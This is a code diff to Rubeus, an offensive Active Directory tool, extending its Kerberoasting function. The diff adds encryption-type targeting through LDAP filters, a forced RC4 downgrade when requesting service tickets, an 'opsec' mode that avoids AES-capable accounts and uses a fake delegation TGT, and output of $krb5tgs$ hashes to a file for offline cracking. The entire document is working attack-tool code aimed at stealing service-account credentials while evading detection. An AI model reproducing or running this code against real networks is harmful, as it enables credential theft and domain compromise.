@@ -264,30 +264,30 @@ namespace Rubeus
             }
         }
 
-        public static void Kerberoast(string spn = "", string userName = "", string OUName = "", string domain = "", string dc = "", System.Net.NetworkCredential cred = null, string outFile = "", KRB_CRED TGT = null, bool useTGTdeleg = false)
+        public static void Kerberoast(string spn = "", string userName = "", string OUName = "", string domain = "", string dc = "", System.Net.NetworkCredential cred = null, string outFile = "", KRB_CRED TGT = null, bool useTGTdeleg = false, string supportedEType = "rc4")
         {
             Console.WriteLine("\r\n[*] Action: Kerberoasting\r\n");
 
             if (TGT != null)
             {
-                Console.WriteLine("[*] Using a TGT /ticket to request service tickets\r\n");
+                Console.WriteLine("[*] Using a TGT /ticket to request service tickets");
             }
-            else if (useTGTdeleg)
+            else if (useTGTdeleg || String.Equals(supportedEType, "rc4opsec"))
             {
-                Console.WriteLine("[*] Using 'tgtdeleg' to request a TGT for the current user\r\n");
+                Console.WriteLine("[*] Using 'tgtdeleg' to request a TGT for the current user");
                 byte[] delegTGTbytes = LSA.RequestFakeDelegTicket("", false);
                 TGT = new KRB_CRED(delegTGTbytes);
             }
 
             if (!String.IsNullOrEmpty(spn))
             {
-                Console.WriteLine("[*] Target SPN             : {0}", spn);
+                Console.WriteLine("\r\n[*] Target SPN             : {0}", spn);
 
                 if (TGT != null)
                 {
                     // if a TGT .kirbi is supplied, use that for the request
                     //      this could be a passed TGT or if TGT delegation is specified
-                    GetTGSRepHash(TGT, spn, "USER", "DISTINGUISHEDNAME", outFile, dc);
+                    GetTGSRepHash(TGT, spn, "USER", "DISTINGUISHEDNAME", outFile, dc, true);
                 }
                 else
                 {
@@ -397,11 +397,11 @@ namespace Rubeus
                     string dirPath = directoryObject.Path;
                     if (String.IsNullOrEmpty(dirPath))
                     {
-                        Console.WriteLine("\r\n[*] Searching the current domain for Kerberoastable users");
+                        Console.WriteLine("[*] Searching the current domain for Kerberoastable users");
                     }
                     else
                     {
-                        Console.WriteLine("\r\n[*] Searching path '{0}' for Kerberoastable users", dirPath);
+                        Console.WriteLine("[*] Searching path '{0}' for Kerberoastable users", dirPath);
                     }
                 }
                 catch (DirectoryServicesCOMException ex)
@@ -421,11 +421,58 @@ namespace Rubeus
                 {
                     if (String.IsNullOrEmpty(userName))
                     {
-                        userSearcher.Filter = "(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt))";
+                        // samAccountType=805306368                                 ->  user account
+                        // serviceprincipalname=*                                   ->  non-null SPN
+                        // samAccountName=krbtgt                                    ->  ignore the krbtgt account
+                        if (String.Equals(supportedEType, "rc4"))
+                        {
+                            // one of the following:
+                            //  !msds-supportedencryptiontypes=*                        ->  null supported etypes, so RC4
+                            //  msds-supportedencryptiontypes=0                         ->  no supported etypes specified, so RC4
+                            //  msds-supportedencryptiontypes:1.2.840.113556.1.4.803:=4 ->  supported etypes includes RC4
+                            Console.WriteLine("[*] Searching for accounts that support RC4_HMAC");
+                            userSearcher.Filter = "(&(samAccountType=805306368)(serviceprincipalname=*)(!samAccountName=krbtgt)(|(!msds-supportedencryptiontypes=*)(msds-supportedencryptiontypes=0)(msds-supportedencryptiontypes:1.2.840.113556.1.4.803:=4)))";
+                        }
+                        else if (String.Equals(supportedEType, "rc4opsec"))
+                        {
+                            // "opsec" RC4, meaning don't RC4 roast accounts that support AES
+                            Console.WriteLine("[*] Searching for accounts that only support RC4_HMAC, no AES");
+                            userSearcher.Filter = "(&(samAccountType=805306368)(serviceprincipalname=*)(!samAccountName=krbtgt)(!msds-supportedencryptiontypes:1.2.840.113556.1.4.804:=24))";
+                        }
+                        else if (String.Equals(supportedEType, "aes"))
+                        {
+                            // msds-supportedencryptiontypes:1.2.840.113556.1.4.804:=24 ->  supported etypes includes AES128/256
+                            Console.WriteLine("[*] Searching for accounts that support AES128_CTS_HMAC_SHA1_96/AES256_CTS_HMAC_SHA1_96");
+                            userSearcher.Filter = "(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(msds-supportedencryptiontypes:1.2.840.113556.1.4.804:=24))";
+                        }
+                        else
+                        {
+                            Console.WriteLine("\r\n[X] Unsupported encryption type: {0}\r\n", supportedEType);
+                            return;
+                        }
                     }
                     else
                     {
-                        userSearcher.Filter = String.Format("(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName={0}))", userName);
+                        if (String.Equals(supportedEType, "rc4"))
+                        {
+                            Console.WriteLine("[*] Searching for accounts that support RC4_HMAC");
+                            userSearcher.Filter = String.Format("(&(samAccountType=805306368)(serviceprincipalname=*)(samAccountName={0})(|(!msds-supportedencryptiontypes=*)(msds-supportedencryptiontypes=0)(msds-supportedencryptiontypes:1.2.840.113556.1.4.803:=4)))", userName);
+                        }
+                        else if (String.Equals(supportedEType, "rc4opsec"))
+                        {
+                            Console.WriteLine("[*] Searching for accounts that only support RC4_HMAC, no AES");
+                            userSearcher.Filter = String.Format("(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName={0})(!msds-supportedencryptiontypes:1.2.840.113556.1.4.804:=24))", userName);
+                        }
+                        else if (String.Equals(supportedEType, "aes"))
+                        {
+                            Console.WriteLine("[*] Searching for accounts that support AES128_CTS_HMAC_SHA1_96/AES256_CTS_HMAC_SHA1_96");
+                            userSearcher.Filter = String.Format("(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName={0})(msds-supportedencryptiontypes:1.2.840.113556.1.4.804:=24))", userName);
+                        }
+                        else
+                        {
+                            Console.WriteLine("\r\n[X] Unsupported encryption type: {0}\r\n", supportedEType);
+                            return;
+                        }
                     }
                 }
                 catch (Exception ex)
@@ -444,7 +491,7 @@ namespace Rubeus
                     }
                     else
                     {
-                        Console.WriteLine("\r\n[*] Found {0} users to Kerberoast!\r\n", users.Count);
+                        Console.WriteLine("\r\n[*] Found {0} users to Kerberoast!", users.Count);
                     }
 
                     foreach (SearchResult user in users)
@@ -452,36 +499,44 @@ namespace Rubeus
                         string samAccountName = user.Properties["samAccountName"][0].ToString();
                         string distinguishedName = user.Properties["distinguishedName"][0].ToString();
                         string servicePrincipalName = user.Properties["servicePrincipalName"][0].ToString();
+                        Interop.SUPPORTED_ETYPE supportedETypes = (Interop.SUPPORTED_ETYPE)0;
+                        if (user.Properties.Contains("msDS-SupportedEncryptionTypes"))
+                        {
+                            supportedETypes = (Interop.SUPPORTED_ETYPE)user.Properties["msDS-SupportedEncryptionTypes"][0];
+                        }
                         Console.WriteLine("\r\n[*] SamAccountName         : {0}", samAccountName);
                         Console.WriteLine("[*] DistinguishedName      : {0}", distinguishedName);
                         Console.WriteLine("[*] ServicePrincipalName   : {0}", servicePrincipalName);
+                        Console.WriteLine("[*] Supported ETypes       : {0}", supportedETypes);
+
                         if (!String.IsNullOrEmpty(domain))
                         {
-                            string SPN = String.Format("{0}@{1}", servicePrincipalName, domain);
-                            if (TGT != null)
+                            servicePrincipalName = String.Format("{0}@{1}", servicePrincipalName, domain);
+                        }
+                        if (TGT != null)
+                        {
+                            // if a TGT .kirbi is supplied, use that for the request
+                            //      this could be a passed TGT or if TGT delegation is specified
+                            if (    String.Equals(supportedEType, "rc4") &&
+                                    (
+                                        ((supportedETypes & Interop.SUPPORTED_ETYPE.AES128_CTS_HMAC_SHA1_96) == Interop.SUPPORTED_ETYPE.AES128_CTS_HMAC_SHA1_96) ||
+                                        ((supportedETypes & Interop.SUPPORTED_ETYPE.AES256_CTS_HMAC_SHA1_96) == Interop.SUPPORTED_ETYPE.AES256_CTS_HMAC_SHA1_96)
+                                    )
+                               )
                             {
-                                // if a TGT .kirbi is supplied, use that for the request
-                                //      this could be a passed TGT or if TGT delegation is specified
-                                GetTGSRepHash(TGT, SPN, samAccountName, distinguishedName, outFile, dc);
+                                // if we're roasting RC4, but AES is supported AND we have a TGT, specify RC4
+                                GetTGSRepHash(TGT, servicePrincipalName, samAccountName, distinguishedName, outFile, dc, true);
                             }
                             else
                             {
-                                // otherwise use the KerberosRequestorSecurityToken method
-                                GetTGSRepHash(SPN, samAccountName, distinguishedName, cred, outFile);
+                                // otherwise don't force RC4
+                                GetTGSRepHash(TGT, servicePrincipalName, samAccountName, distinguishedName, outFile, dc, false);
                             }
                         }
-                        else {
-                            if (TGT != null)
-                            {
-                                // if a TGT .kirbi is supplied, use that for the request
-                                //      this could be a passed TGT or if TGT delegation is specified
-                                GetTGSRepHash(TGT, servicePrincipalName, samAccountName, distinguishedName, outFile, dc);
-                            }
-                            else
-                            {
-                                // otherwise use the KerberosRequestorSecurityToken method
-                                GetTGSRepHash(servicePrincipalName, samAccountName, distinguishedName, cred, outFile);
-                            }
+                        else
+                        {
+                            // otherwise use the KerberosRequestorSecurityToken method
+                            GetTGSRepHash(servicePrincipalName, samAccountName, distinguishedName, cred, outFile);
                         }
                     }
                 }
@@ -609,9 +664,19 @@ namespace Rubeus
             }
         }
 
-        public static void GetTGSRepHash(KRB_CRED TGT, string spn, string userName = "user", string distinguishedName = "", string outFile = "", string domainController = "")
+        public static void GetTGSRepHash(KRB_CRED TGT, string spn, string userName = "user", string distinguishedName = "", string outFile = "", string domainController = "", bool rc4 = false)
         {
             // use a TGT blob to request a hash instead of the KerberosRequestorSecurityToken method
+
+            string userDomain = "DOMAIN";
+
+            if (Regex.IsMatch(distinguishedName, "^CN=.*", RegexOptions.IgnoreCase))
+            {
+                // extract the domain name from the distinguishedname
+                Match dnMatch = Regex.Match(distinguishedName, "(?<Domain>DC=.*)", RegexOptions.IgnoreCase);
+                string domainDN = dnMatch.Groups["Domain"].ToString();
+                userDomain = domainDN.Replace("DC=", "").Replace(',', '.');
+            }
 
             // extract out the info needed for the TGS-REQ request
             string tgtUserName = TGT.enc_part.ticket_info[0].pname.name_string[0];
@@ -625,17 +690,18 @@ namespace Rubeus
             foreach (string sname in services)
             {
                 // request the new service tickt
-                byte[] tgsBytes = Ask.TGS(tgtUserName, domain, ticket, clientKey, etype, sname, false, domainController, false);
+                byte[] tgsBytes = Ask.TGS(tgtUserName, domain, ticket, clientKey, etype, sname, false, domainController, false, rc4);
 
-                KRB_CRED tgsKirbi = new KRB_CRED(tgsBytes);
-
-                DisplayTGShash(tgsKirbi, true);
-
-                Console.WriteLine();
+                if (tgsBytes != null)
+                {
+                    KRB_CRED tgsKirbi = new KRB_CRED(tgsBytes);
+                    DisplayTGShash(tgsKirbi, true, userName, userDomain, outFile);
+                    Console.WriteLine();
+                }
             }
         }
 
-        public static void DisplayTGShash(KRB_CRED cred, bool kerberoastDisplay = false, string kerberoastUser = "USER", string kerberoastDomain = "DOMAIN")
+        public static void DisplayTGShash(KRB_CRED cred, bool kerberoastDisplay = false, string kerberoastUser = "USER", string kerberoastDomain = "DOMAIN", string outFile = "")
         {
             // output the hash of the encrypted KERB-CRED service ticket in a kerberoast hash form
 
@@ -647,34 +713,49 @@ namespace Rubeus
             string cipherText = BitConverter.ToString(cred.tickets[0].enc_part.cipher).Replace("-", string.Empty);
             string hash = String.Format("$krb5tgs${0}$*{1}${2}${3}*${4}${5}", encType, kerberoastUser, kerberoastDomain, sname, cipherText.Substring(0, 32), cipherText.Substring(32));
 
-            bool header = false;
-            foreach (string line in Helpers.Split(hash, 80))
+            if (!String.IsNullOrEmpty(outFile))
             {
-                if (!header)
+                string outFilePath = Path.GetFullPath(outFile);
+                try
                 {
-                    if (kerberoastDisplay)
+                    File.AppendAllText(outFilePath, hash + Environment.NewLine);
+                }
+                catch (Exception e)
+                {
+                    Console.WriteLine("Exception: {0}", e.Message);
+                }
+                Console.WriteLine("[*] Hash written to {0}", outFilePath);
+            }
+            else
+            {
+                bool header = false;
+                foreach (string line in Helpers.Split(hash, 80))
+                {
+                    if (!header)
                     {
-                        Console.WriteLine("[*] Hash                   : {0}", line);
+                        if (kerberoastDisplay)
+                        {
+                            Console.WriteLine("[*] Hash                   : {0}", line);
+                        }
+                        else
+                        {
+                            Console.WriteLine("  Kerberoast Hash       :  {0}", line);
+                        }
                     }
                     else
                     {
-                        Console.WriteLine("  Kerberoast Hash       :  {0}", line);
+                        if (kerberoastDisplay)
+                        {
+                            Console.WriteLine("                             {0}", line);
+                        }
+                        else
+                        {
+                            Console.WriteLine("                           {0}", line);
+                        }
                     }
+                    header = true;
                 }
-                else
-                {
-                    if (kerberoastDisplay)
-                    {
-                        Console.WriteLine("                             {0}", line);
-                    }
-                    else
-                    {
-                        Console.WriteLine("                           {0}", line);
-                    }
-                }
-                header = true;
             }
         }
-
     }
 }
